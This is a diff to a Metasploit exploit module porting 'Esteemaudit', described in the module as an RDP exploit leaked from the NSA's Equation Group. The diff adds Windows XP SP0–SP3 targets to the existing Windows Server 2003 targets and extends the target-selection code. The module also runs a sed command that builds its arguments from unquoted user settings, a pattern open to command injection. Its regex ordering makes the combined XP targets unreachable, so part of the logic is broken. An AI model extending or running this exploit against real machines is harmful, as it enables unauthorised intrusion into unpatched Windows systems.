@@ -9,7 +9,7 @@ class MetasploitModule < Msf::Exploit::Remote
       'Name'        => 'Esteemaudit',
       'Description' => %q{
           This is a porting of the infamous Esteemaudit RDP Exploit leaked from Equationgroup (NSA).
-	  Vulnerable machines are Windows Server 2003 SP1,SP2. 
+	  Vulnerable machines are Windows Server 2003 SP1,SP2 and Windows XP SP0, SP1, SP3. 
       },
       'Author'      =>
         [
@@ -23,9 +23,15 @@ class MetasploitModule < Msf::Exploit::Remote
           'BadChars'   => "\x00\x0a\x0d",
         },
       'Platform'       => 'win',
-      'DefaultTarget'  => 3,
+      'DefaultTarget'  => 8,
       'Targets'        =>
         [
+	  ['XPSP0         Windows XP SP0',{}],
+	  ['XPSP1         Windows XP SP1',{}],
+	  ['XPSP0|1       Windows XP SP0 or SP1',{}],
+	  ['XPSP2         Windows XP SP2',{}],
+          ['XPSP3         Windows XP SP3',{}],
+	  ['XPSP2|3       Windows XP SP2 or SP3',{}],
 	  ['W2K3SP0       Windows 2003 SP0',{}],
 	  ['W2K3SP1       Windows 2003 SP1',{}],
 	  ['W2K3SP2       Windows 2003 SP2',{}],
@@ -66,7 +72,19 @@ class MetasploitModule < Msf::Exploit::Remote
   sed = `sed -i 's/%TARGETARCHITECTURE%/#{datastore['TARGETARCHITECTURE']}/' #{datastore['ESTEEMAUDITPATH']}/Esteemaudit-2.1.0.xml`
   
   #WIN72K8R2 (6-8) and XP (0-5)
-  if target.name =~ /Windows 2003 SP0/
+  if target.name =~ /Windows XP SP0/
+	objective = "XPSP0"
+  elsif target.name =~ /Windows XP SP1/
+	objective = "XPSP1"
+  elsif target.name =~ /Windows XP SP0 or SP1/
+	objective = "XPSP0|1"
+  elsif target.name =~ /Windows XP SP2/
+	objective = "XPSP2"
+  elsif target.name =~ /Windows XP SP3/
+	objective = "XPSP3"
+  elsif target.name =~ /Windows XP SP2 or SP3/
+	objective = "XPSP2|3"
+  elsif target.name =~ /Windows 2003 SP0/
 	objective = "W2K3SP0"
   elsif target.name =~ /Windows 2003 SP1/
 	objective = "W2K3SP1"
